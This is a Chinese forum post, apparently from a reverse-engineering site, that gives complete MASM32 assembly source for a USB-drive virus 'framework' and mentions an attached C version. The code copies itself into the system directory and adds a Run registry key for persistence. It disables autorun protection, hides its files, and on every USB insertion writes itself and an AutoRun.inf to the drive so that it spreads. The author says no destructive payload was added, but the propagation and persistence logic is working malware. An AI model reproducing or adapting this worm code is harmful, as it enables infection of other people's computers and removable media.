
# U 盘病毒(WIN32 汇编)

> 原文：[`www.pediy.com/kssd/pediy12/99918.html`](https://www.pediy.com/kssd/pediy12/99918.html)

【文章标题】: `U 盘病毒框架(WIN32 汇编)`

【文章作者】: 无名无姓

【作者 QQ 号】: 992017170

【软件大小】: 3.5

【编写语言】: MASM32

【操作平台】: winXP

【软件介绍】: 一个 U 盘病毒大概设计框架 ，没有加破坏代码部分

【作者声明】: 只是感兴趣，没有其他目的。失误之处敬请诸位大侠赐教!

\--------------------------------------------------------------------------------

## 【代码部分】:

```
.386

.model flat,stdcall

option casemap:none

include windows.inc

include shlwapi.inc

include  user32.inc

includelib user32.lib

include kernel32.inc

includelib kernel32.lib

includelib shlwapi.lib

include Advapi32.inc

includelib Advapi32.lib

include DBT.inc

.data?

szExePath  db  MAX_PATH  dup(?)

szSysPath  db MAX_PATH  dup(?)

U   db 3 dup(?)

hInstance dd ?

hMainWnd dd ?

.const

szClassName  db 'xk',0

szUName  db 'xk_U.exe',0

szSysName  db 'xk_Sys.exe',0

szAutoRunFile db 'AutoRun.inf',0

szReError   db  'RegisterClass error!',0

szRegOne    db 'Software\Microsoft\Windows\CurrentVersion\Policies\Explorer',0

szRegTwo    db 'NoDriveTypeAutoRun',0

szRegThree  db 'SOFTWARE\MICROSOFT\Windows\CurrentVersion\Run',0

szOne       db '\\',0

szFileOne   db  '[AutoRun]',0dh,0ah,0

szFileTwo   db  'open=',0

szFileFour  db  0dh,0ah,0

szFileThree db  'shellExecute=',0

szFileFive  db  'shell\Auto\command=',0

szFileSix   db  'shell=Auto',0dh,0ah,0

.code

WndProc Proto  :dword ,:dword ,:dword,:dword

FirstDriveFromMask  Proto   :dword

FileExist  Proto :dword

GetSelfPath Proto  :  dword

GetSysPath  Proto  :  dword

SetFileAttrib  Proto:  dword

RegAutoRun   Proto:  dword

CopyToUAndSet  Proto   

CreateAutoRunFile  Proto:  dword

FindSelf   Proto

GetSysPath proc path1
  invoke GetSystemDirectory,path1,MAX_PATH
  ret
GetSysPath endp

GetSelfPath proc path2
  invoke GetModuleFileName,NULL,path2,MAX_PATH
  .if eax
    mov eax,TRUE
    ret
  .endif
  mov eax,FALSE
  ret
GetSelfPath endp

FileExist proc path3
  local @result
  invoke PathFileExists,path3
  mov @result ,eax
  .if eax==1
    mov eax,TRUE
    ret
  .endif
  mov eax,FALSE
  ret
FileExist endp

RegAutoRun  proc path4
  local @hkey
  local @v
  mov @v,0
  invoke RegOpenKey,HKEY_CURRENT_USER,offset szRegOne,addr @hkey
  invoke RegSetValueEx,@hkey,offset szRegTwo,NULL,REG_DWORD,addr @v,sizeof dword
  invoke RegOpenKey,HKEY_LOCAL_MACHINE,offset szRegThree,addr @hkey
  .if eax==ERROR_SUCCESS
    invoke RegSetValueEx,@hkey,addr szSysName,NULL,REG_SZ, path4,MAX_PATH
    invoke RegCloseKey,@hkey
    mov eax,TRUE
  .else
    mov eax,FALSE
  .endif
  ret
RegAutoRun endp

SetFileAttrib  proc path5
  invoke SetFileAttributes,path5,FILE_ATTRIBUTE_SYSTEM or FILE_ATTRIBUTE_HIDDEN
  ret
SetFileAttrib  endp

FindSelf   proc
  local @pe:PROCESSENTRY32
  local @hShot
  local @exe[100]:byte
  invoke CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,0
  mov @hShot,eax
  mov @pe.dwSize,sizeof PROCESSENTRY32
  invoke Process32First,@hShot,addr @pe
  .if eax
    .repeat
      invoke lstrcmp,addr @pe.szExeFile,addr szSysName
      .if eax==0
        invoke CloseHandle,@hShot
        mov eax,TRUE
        ret
      .endif
      invoke Process32Next,@hShot,addr @pe
    .until eax==0
  .endif
  invoke CloseHandle,@hShot
  mov eax,FALSE
  ret
FindSelf  endp

CopyToSysAndSet  proc hwnd
  local @szPath[MAX_PATH]:byte
  invoke RtlZeroMemory,addr @szPath,MAX_PATH
  invoke lstrcpy,addr @szPath,addr szSysPath
  invoke lstrcat,addr @szPath,addr szOne
  invoke lstrcat,addr @szPath,addr szSysName
  invoke FileExist,addr @szPath
  .if !eax
    invoke CopyFile,addr szExePath,addr @szPath,FALSE
    invoke RegAutoRun,addr @szPath
    invoke SetFileAttrib,addr @szPath
  .else
    invoke FindSelf
      .if !eax
        invoke WinExec,addr @szPath,SW_HIDE
        invoke SendMessage,hwnd,WM_CLOSE,0,0
      .endif
  .endif
  mov eax,FALSE
  ret
CopyToSysAndSet  endp

CopyToUAndSet  proc 
  local @szPath[MAX_PATH]:byte
  local @szAutoFile[MAX_PATH]:byte
  invoke lstrcpy,addr @szPath,addr U
  invoke lstrcat,addr @szPath,addr szOne
  invoke lstrcat,addr @szPath,addr szUName
  invoke lstrcpy,addr @szAutoFile,addr U
  invoke lstrcat,addr @szAutoFile,addr szOne
  invoke lstrcat,addr @szAutoFile,addr szAutoRunFile
  invoke FileExist,addr @szAutoFile
  .if !eax
    invoke CreateAutoRunFile,addr @szAutoFile
    invoke SetFileAttrib,addr @szAutoFile
  .endif
  invoke FileExist,addr @szPath
  .if !eax
    invoke CopyFile,addr szExePath,addr @szPath,FALSE
    invoke SetFileAttrib,addr @szPath
  .endif
  mov eax,FALSE
  ret
CopyToUAndSet  endp

CreateAutoRunFile   proc  path
  local @hFile
  local @dwWrite
  invoke CreateFile,path,GENERIC_WRITE,FILE_SHARE_READ,0,CREATE_ALWAYS,\
    FILE_ATTRIBUTE_NORMAL,0
  mov @hFile,eax
  .if eax
    invoke WriteFile,@hFile,addr szFileOne,sizeof szFileOne,addr @dwWrite,0
    invoke WriteFile,@hFile,addr szFileTwo,sizeof szFileTwo,addr @dwWrite,0
    invoke WriteFile,@hFile,addr szUName,sizeof szUName,addr @dwWrite,0
    invoke WriteFile,@hFile,addr szFileFour,sizeof szFileFour,addr @dwWrite,0
    invoke WriteFile,@hFile,addr szFileThree,sizeof szFileThree,addr @dwWrite,0
    invoke WriteFile,@hFile,addr szUName,sizeof szUName,addr @dwWrite,0
    invoke WriteFile,@hFile,addr szFileFour,sizeof szFileFour,addr @dwWrite,0
    invoke WriteFile,@hFile,addr szFileFive, sizeof szFileFive,addr @dwWrite,0
    invoke WriteFile,@hFile,addr szUName,sizeof szUName,addr @dwWrite,0
    invoke WriteFile,@hFile,addr szFileFour,sizeof szFileFour,addr @dwWrite,0
    invoke WriteFile, @hFile,addr szFileSix,sizeof szFileSix,addr @dwWrite,0
    invoke CloseHandle,@hFile
    mov eax,TRUE
    ret
  .endif
  mov eax ,FALSE
  ret
CreateAutoRunFile  endp

;10
FirstDriveFromMask  proc  unitmask
  local @i:byte
  mov @i,0
  .while @i<26
    .if unitmask & 1h
      .break
    .endif
    shr unitmask ,1
    inc @i
  .endw
  mov al,'A'
  add @i,al
  mov al, @i
  ret
FirstDriveFromMask  endp

OnDeviceChange proc uses esi ebx  hwnd,wParam,lParam
              ;将 DEV_BROADCAST_HDR 的地址放到 esi
               mov esi,lParam
           mov eax,wParam
           .if eax==DBT_DEVICEARRIVAL
          mov ebx,[esi+DEV_BROADCAST_HDR.dbch_devicetype]
             .if ebx==DBT_DEVTYPE_VOLUME
            mov eax,[esi+DEV_BROADCAST_VOLUME.dbcv_unitmask]
                  invoke FirstDriveFromMask,eax
            mov U[0],al
            invoke CopyToUAndSet
          .endif
              .endif
        .if  eax==DBT_DEVICEREMOVECOMPLETE
        .endif
        ;invoke LRESULT,NULL
        ret
OnDeviceChange endp

WndProc proc uses ebx edi esi hwnd,message,wParam,lParam
  mov eax,message
  .if eax==WM_CREATE
    mov U[1],':'
              invoke GetSysPath,offset szSysPath
    invoke SetTimer,hwnd,1,500,0
    invoke GetSelfPath,offset szExePath
    mov eax,0
  .elseif eax==WM_TIMER
    mov al,szSysPath[0]
    .if szExePath[0]==al
      invoke SendMessage,hwnd,WM_DEVICECHANGE,0,0
    .else
      invoke CopyToSysAndSet,hwnd
    .endif
    mov eax,0
  .elseif eax==WM_DEVICECHANGE
    invoke OnDeviceChange,hwnd,wParam,lParam
    mov eax,0
  .elseif eax==WM_DESTROY
    invoke KillTimer,hwnd,1
    invoke PostQuitMessage,0
    mov eax,0
  .else
    invoke DefWindowProc,hwnd,message,wParam,lParam
    ret
  .endif
  xor eax,eax
  ret
```



```
WndProc endp  

Main  Proc   

   local @msg:MSG  
   local @wndclass:WNDCLASSEX  
   ;local @hAccelerator  
   invoke GetModuleHandle,NULL  
   mov hInstance,eax  
   invoke RtlZeroMemory,addr @wndclass,sizeof @wndclass  
   invoke LoadCursor,0,0  
          mov @wndclass.hCursor,eax  
   push hInstance  
   pop @wndclass.hInstance  
   mov @wndclass.cbSize,sizeof WNDCLASSEX  
   mov @wndclass.style,0  
   mov @wndclass.lpfnWndProc,offset WndProc  
   mov @wndclass.hbrBackground,0  
   mov @wndclass.lpszClassName,offset szClassName  
   invoke RegisterClassEx,addr @wndclass  
          invoke CreateWindowEx,WS_EX_CLIENTEDGE ,offset szClassName,offset szUName,\  
    WS_OVERLAPPEDWINDOW,100,100,600,400,NULL,NULL,hInstance,NULL  
   mov hMainWnd,eax  
   .while  TRUE  
           invoke GetMessage,addr @msg,NULL,0,0  
      .break .if eax==0  
      invoke TranslateMessage,addr @msg  
      invoke DispatchMessage,addr @msg  
      ;.endif  
   .endw  
   ret  

Main  endp  

start:  

     call Main  
     invoke ExitProcess,NULL  
     end start  
```

上面的 `DBT.INC` 为本人根据 `DBT.H` 所写，因为在网上没有找到，如果哪位大侠有，给偶一份！

功能：更改注册表（开机启动），将此程序拷贝到系统目录和 U 盘中  并生成 `Autorun.inf`  .......

此程序只是简单的实现 U 盘病毒的一个框架，没有加入破坏系统或其它软件的代码，至于 `DBT.INC` 里面是结构和数据的定义部分，并无对函数的说明，应该没有相对应的 `dll` 部分,附件中加入了此程序的 C 版本，希望对大家有所帮助。本人小菜一只，大侠勿笑！

上传的附件

| ![](img/67af4f1ef9c98996f43e89e749c7dcf5.jpg) || U 盘病毒.rar  

 |

| ![](img/67af4f1ef9c98996f43e89e749c7dcf5.jpg) || C++_ 版本.rar  

 |
